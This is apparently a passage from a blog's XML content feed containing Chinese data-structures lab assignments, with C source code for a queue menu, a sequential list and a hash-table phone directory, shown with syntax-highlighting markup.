            printf<span class="token punctuation">(</span><span class="token string">"为空队列<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>DeQueue<span class="token punctuation">(</span>Q, e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            printf<span class="token punctuation">(</span><span class="token string">"队头元素%d已删除<span class="token entity" title="\n">\n</span>"</span>,e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
            <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">3</span>:
            if<span class="token punctuation">(</span>QueueEmpty<span class="token punctuation">(</span>Q<span class="token punctuation">))</span>
            printf<span class="token punctuation">(</span><span class="token string">"为空队列<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
            printf<span class="token punctuation">(</span><span class="token string">"不是空队列<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">4</span>:
            if<span class="token punctuation">(</span>QueueEmpty<span class="token punctuation">(</span>Q<span class="token punctuation">))</span>
            printf<span class="token punctuation">(</span><span class="token string">"为空队列<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
             printf<span class="token punctuation">(</span><span class="token string">"队列为:<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            PrintQueue<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">;</span>//输出队列
            printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>break<span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">5</span>:
            ClearQueue<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">;</span>
            printf<span class="token punctuation">(</span><span class="token string">"已清空队列<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    
 <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构顺序表</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A1%BA%E5%BA%8F%E8%A1%A8/</url>
    <content><![CDATA[<p>实验项目名称：线性表的存储结构<br>实验目的与要求：<br>1.基础知识:掌握数据结构中线性表的相关知识;<br>掌握C或VC+ +语言中程序设计的方法。<br>2.程序功能:<br>(1)参考教材相关算法，分别用顺序式和链式两种存储结构实现线性表的操作;<br>(2)实现已建立线性表中元素的查找、插入和删除。<br>实验性质:验证性(4学时，其中顺序表2学时，链表2学时)<br>说明：程序包含的主要函数:主函数、操作界面、<br>建立空线性表、获取第i个元素的值、在第i个位<br>置前插入元素e、删除第i个元素且用e返回删除的<br>元素值。<br>注意：<br>(1) 应有相关注释，尤其是每个子函数的功能注释;<br>(2) 主函数调用子函数的逻辑顺序一主 函数调用建立线性表子函数应在调用其他子函数之前,这须在主函数中进行条件控制。<br>(3)在选定存储结构后，需要特别关注“表不存在”和“空表”的语句表达方式以及它们的使用时机和方式。<br>如:顺序表中，表达表不存在的语句是:L.elem=NULL ;<br>建立空表语句是:调用lnitList Sq (L) ;<br>在带头结点的链表中，表达表不存在的语句是:L=NULL;<br>建立空表语句是: L-&gt;next=NULL或者调用InitList_ L (L) ;</p>
<p>顺序式线性表<br>源代码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#include&lt;stdio.h></span>
<span class="token comment">#include&lt;malloc.h>//动态存储分配函数头文件//</span>
<span class="token comment">#define TRUE        1</span>
<span class="token comment">#define FALSE       0</span>
<span class="token comment">#define OK          1</span>
<span class="token comment">#define ERROR       0</span>
<span class="token comment">#define List_Init_Size 100</span>
<span class="token comment">#define List_Increment 10</span>
typedef int Status<span class="token punctuation">;</span>
typedef int ElemType<span class="token punctuation">;</span>
typedef struct
<span class="token punctuation">&#123;</span>
   ElemType *elem<span class="token punctuation">;</span>
   int length<span class="token punctuation">;</span>
   int listsize<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>SqList<span class="token punctuation">;</span>

Status InitList_Sq<span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span>//构造一个空线性表
<span class="token punctuation">&#123;</span>
  L.elem <span class="token operator">=</span> <span class="token punctuation">(</span>ElemType*<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>List_Init_Size*sizeof<span class="token punctuation">(</span>ElemType<span class="token punctuation">))</span><span class="token punctuation">;</span>
  if<span class="token punctuation">(</span><span class="token operator">!</span>L.elem<span class="token punctuation">)</span>
  return<span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>//存储分配失败
  L.length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>//空表长度为0
  L.listsize <span class="token operator">=</span> List_Init_Size<span class="token punctuation">;</span>//初始存储容量
     <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status ListInsert_Sq<span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L,int i,ElemType e<span class="token punctuation">)</span>//插入一个元素
<span class="token punctuation">&#123;</span>
    //在顺序线性表L中第i个位置之前插入新的元素e
    //i的合法值为<span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span><span class="token operator">=</span>i<span class="token operator">&lt;</span><span class="token operator">=</span>ListLength_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span>+1
    int *newbase<span class="token punctuation">;</span>
    int *q ,*p<span class="token punctuation">;</span>
    if<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L.length+1<span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>//i值不合法
    if<span class="token punctuation">(</span>L.length <span class="token operator">></span><span class="token operator">=</span> L.listsize<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        //当前空间已满，增加分配
        newbase <span class="token operator">=</span> <span class="token punctuation">(</span>ElemType*<span class="token punctuation">)</span>realloc<span class="token punctuation">(</span>L.elem,
        <span class="token punctuation">(</span>L.listsize+List_Increment<span class="token punctuation">)</span>*sizeof<span class="token punctuation">(</span>ElemType<span class="token punctuation">))</span><span class="token punctuation">;</span>
        if<span class="token punctuation">(</span><span class="token operator">!</span>newbase<span class="token punctuation">)</span>
        <span class="token builtin class-name">return</span> <span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>//存储分配失败
        L.elem <span class="token operator">=</span> newbase<span class="token punctuation">;</span>//新基址
        L.listsize <span class="token operator">=</span> L.listsize + List_Increment<span class="token punctuation">;</span>//增加存储容量
    <span class="token punctuation">&#125;</span>
    q <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>L.elem<span class="token punctuation">[</span>i-1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//q为插入位置
    for<span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>L.elem<span class="token punctuation">[</span>L.length-1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">></span><span class="token operator">=</span>q<span class="token punctuation">;</span>p--<span class="token punctuation">)</span>*<span class="token punctuation">(</span>p+1<span class="token punctuation">)</span><span class="token operator">=</span>*p<span class="token punctuation">;</span>//插入位置及之后的元素后移
    *q <span class="token operator">=</span> e<span class="token punctuation">;</span>//插入e
    ++L.length<span class="token punctuation">;</span>//表长增1
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>//插入操作

Status ListDetetle_Sq<span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L,int i,ElemType <span class="token operator">&amp;</span>e<span class="token punctuation">)</span>//删除一个元素
<span class="token punctuation">&#123;</span>
    //在顺序线性表L中删除第i个元素，
    //i的合法值为<span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span><span class="token operator">=</span>i<span class="token operator">&lt;</span><span class="token operator">=</span>ListLength_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span>
    int *p<span class="token punctuation">;</span>
    int *q<span class="token punctuation">;</span>
    if<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L.length+1<span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>//i值不合法
    p <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>L.elem<span class="token punctuation">[</span>i-1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//p为被删除元素的位置
    e <span class="token operator">=</span> *p<span class="token punctuation">;</span>//被删除的元素的值赋给e
    q <span class="token operator">=</span> L.elem + L.length-1<span class="token punctuation">;</span>//表尾元素的位置
    for<span class="token punctuation">(</span>++p<span class="token punctuation">;</span>p<span class="token operator">&lt;</span><span class="token operator">=</span>q<span class="token punctuation">;</span>p++<span class="token punctuation">)</span> *<span class="token punctuation">(</span>p-1<span class="token punctuation">)</span><span class="token operator">=</span> *p<span class="token punctuation">;</span>//被删除元素之后的元素左移
    --L.length<span class="token punctuation">;</span>//表长减1
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status GetElem_Sq<span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L,int i,ElemType <span class="token operator">&amp;</span>e<span class="token punctuation">)</span>//查找一个元素
<span class="token punctuation">&#123;</span>
    if<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L.length<span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>
    e <span class="token operator">=</span> L.elem<span class="token punctuation">[</span>i-1<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> e<span class="token punctuation">;</span>
	
<span class="token punctuation">&#125;</span>

Status ListLength_Sq<span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span>//求线性表表长
<span class="token punctuation">&#123;</span>
    if<span class="token punctuation">(</span>L.length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
       <span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> L.length<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status ClearList_Sq<span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span>//将线性表重置为空表
<span class="token punctuation">&#123;</span>
    L.length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status PrintList_Sq<span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    int i<span class="token punctuation">;</span>
    if<span class="token punctuation">(</span>L.length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
		printf<span class="token punctuation">(</span><span class="token string">"线性表为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"线性表为： "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        for<span class="token punctuation">(</span> <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>L.length<span class="token punctuation">;</span> i++<span class="token punctuation">)</span> printf<span class="token punctuation">(</span><span class="token string">"%d "</span>,L.elem<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status Operatemenu<span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span>  //操作菜单
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------****操作菜单****------<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span><span class="token string">"------    0 退出系统<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    1 插入一个元素<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    2 查找一个元素<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    3 删除一个元素<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    4 输出线性表表长<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span><span class="token string">"------    5 将线性表重置为空表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    6 输出线性表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    请选择你所需要的操作<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

int main<span class="token punctuation">(</span><span class="token punctuation">)</span>//主函数
<span class="token punctuation">&#123;</span>
	SqList L<span class="token punctuation">;</span>
	int <span class="token assign-left variable">num</span><span class="token operator">=</span>-1, i<span class="token punctuation">;</span>
	ElemType e<span class="token punctuation">;</span>
	if<span class="token punctuation">(</span>InitList_Sq<span class="token punctuation">(</span>L<span class="token punctuation">))</span>
	<span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"------  线性表创建成功<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
	while<span class="token punctuation">(</span>num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		Operatemenu<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>
        scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
	switch<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
     <span class="token keyword">case</span> <span class="token number">1</span>:
		    printf<span class="token punctuation">(</span><span class="token string">"分别输入储存地址i和储存元素e:<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		    scanf<span class="token punctuation">(</span><span class="token string">"%d%d"</span>,<span class="token operator">&amp;</span>i,<span class="token operator">&amp;</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            if<span class="token punctuation">(</span><span class="token operator">!</span>ListInsert_Sq<span class="token punctuation">(</span>L,i,e<span class="token punctuation">))</span> // 判断i值是否合法
			   printf<span class="token punctuation">(</span><span class="token string">"i值不合法<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
			  <span class="token punctuation">&#123;</span> printf<span class="token punctuation">(</span><span class="token string">"已经将%d存入顺序表<span class="token entity" title="\n">\n</span>"</span>, e<span class="token punctuation">)</span><span class="token punctuation">;</span>
              PrintList_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
            <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">2</span>:
		    printf<span class="token punctuation">(</span><span class="token string">"请输入查找的位置i:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            if<span class="token punctuation">(</span><span class="token operator">!</span>GetElem_Sq<span class="token punctuation">(</span>L,i,e<span class="token punctuation">))</span>// 判断i值是否合法
			   printf<span class="token punctuation">(</span><span class="token string">"i值不合法<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token keyword">else</span>
			   <span class="token punctuation">&#123;</span> printf<span class="token punctuation">(</span><span class="token string">"%d位置的元素为:"</span>, i<span class="token punctuation">)</span><span class="token punctuation">;</span>
				printf<span class="token punctuation">(</span><span class="token string">"%d<span class="token entity" title="\n">\n</span>"</span>,e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
			<span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">3</span>:
		    printf<span class="token punctuation">(</span><span class="token string">"请输入删除的位置i:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
		    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
			if<span class="token punctuation">(</span><span class="token operator">!</span>ListDetetle_Sq<span class="token punctuation">(</span>L,i,e<span class="token punctuation">))</span> // 判断i值是否合法
			   printf<span class="token punctuation">(</span><span class="token string">"i值不合法<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
			 <span class="token punctuation">&#123;</span> printf<span class="token punctuation">(</span><span class="token string">"已经将%d位置的元素删除<span class="token entity" title="\n">\n</span>"</span>, i<span class="token punctuation">)</span><span class="token punctuation">;</span>
              PrintList_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
			  <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">4</span>:ListLength_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>
           printf<span class="token punctuation">(</span><span class="token string">"线性表表长为"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		    printf<span class="token punctuation">(</span><span class="token string">"%d<span class="token entity" title="\n">\n</span>"</span>,L.length<span class="token punctuation">)</span><span class="token punctuation">;</span>
		    <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
	 <span class="token keyword">case</span> <span class="token number">5</span>:ClearList_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>
		    printf<span class="token punctuation">(</span><span class="token string">"线性表已重置为空表<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			PrintList_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token builtin class-name">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">6</span>:PrintList_Sq<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>		    
 <span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构哈希表</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<p>实验项目名称：电话号码查询系统的实现<br>实验目的与要求:<br>1.基础知识:掌握数据结构中的查找、排序等算法相关知识;掌握C或VC++语言中程序设计的方法。<br>2.参考教材相关算法，完成以下程序功能:<br>(1)自选存储结构(顺序表或哈希表)实现电话号码表的初始化创建;<br>(2)编写一个电话号码查询系统，要求有电话号码记录的录入(插入)存储、查询、删除、打印、排序(顺序表存储结构必须有此功能，哈希表结构则不写此功能)等模块;<br>实验性质:验证性(4学时)<br>说明:当存储结构采用哈希表时此方式为推荐方式)，数据元素为结构体类型(成 员至少包括姓名、电话号码)，以电话号码或姓名为关键字构建哈希表，并进行查询、插入、删除、打印记录等功能模块，(其次子 函数的调用顺序由最终用户决定(可用多分支结构),程序中应有用户的操作选择界面。采用顺序存储结构时，数据元素也应为结构体类型(成员至少包括姓名、电话号码)构造成顺序表，自行设计元素存储(包括插入新元素)的顺序，以电话号码或姓名为关键字完成用户指定元素的查询、删除、排序操作，还应完成顺序表的打印操作。</p>
<p>图源代码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#include&lt;stdio.h></span>
<span class="token comment">#include&lt;string.h></span>
typedef int Status<span class="token punctuation">;</span>
<span class="token comment">#define length 10</span>
typedef struct list
<span class="token punctuation">&#123;</span>
    struct node *lnext<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>good<span class="token punctuation">;</span>
good lis<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>//去掉good被误以为声明变量
struct node
<span class="token punctuation">&#123;</span>
    char name<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    char num<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    char address<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    struct node *next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

Status hash<span class="token punctuation">(</span>struct node record<span class="token punctuation">)</span>//11位电话号码相加，再取7的余数为哈希地址
<span class="token punctuation">&#123;</span>
    int <span class="token assign-left variable">key</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token assign-left variable">key</span><span class="token operator">=</span>key+<span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span>record.num<span class="token punctuation">[</span>i<span class="token punctuation">]</span>-<span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//强制转换为整形
    <span class="token punctuation">&#125;</span>
    <span class="token assign-left variable">key</span><span class="token operator">=</span>key%7<span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> key<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status createnode<span class="token punctuation">(</span><span class="token punctuation">)</span>//插入电话记录
<span class="token punctuation">&#123;</span>
    struct node *temp<span class="token operator">=</span> new node<span class="token punctuation">;</span>
    temp-<span class="token operator">></span>next<span class="token operator">=</span>NULL<span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"请输入姓名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%s"</span>,temp-<span class="token operator">></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"输入电话："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%s"</span>,temp-<span class="token operator">></span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"输入地址:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%s"</span>,temp-<span class="token operator">></span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>
    int <span class="token assign-left variable">k</span><span class="token operator">=</span>hash<span class="token punctuation">(</span>*temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    struct list *p<span class="token operator">=</span><span class="token operator">&amp;</span>lis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
    if<span class="token punctuation">(</span>p-<span class="token operator">></span>lnext<span class="token operator">!=</span>NULL<span class="token punctuation">)</span>
    temp-<span class="token operator">></span>next<span class="token operator">=</span>p-<span class="token operator">></span>lnext<span class="token punctuation">;</span>
    p-<span class="token operator">></span>lnext<span class="token operator">=</span>temp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status showlist<span class="token punctuation">(</span><span class="token punctuation">)</span>//打印非空位元素
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"姓名<span class="token entity" title="\t">\t</span><span class="token entity" title="\t">\t</span>电话号码<span class="token entity" title="\t">\t</span><span class="token entity" title="\t">\t</span>地址<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        struct node *q<span class="token operator">=</span>lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span>.lnext<span class="token punctuation">;</span>
        
        while<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            printf<span class="token punctuation">(</span><span class="token string">"%s<span class="token entity" title="\t">\t</span><span class="token entity" title="\t">\t</span>%s<span class="token entity" title="\t">\t</span><span class="token entity" title="\t">\t</span>%s<span class="token entity" title="\n">\n</span>"</span>,q-<span class="token operator">></span>name,q-<span class="token operator">></span>num,q-<span class="token operator">></span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token assign-left variable">q</span><span class="token operator">=</span>q-<span class="token operator">></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

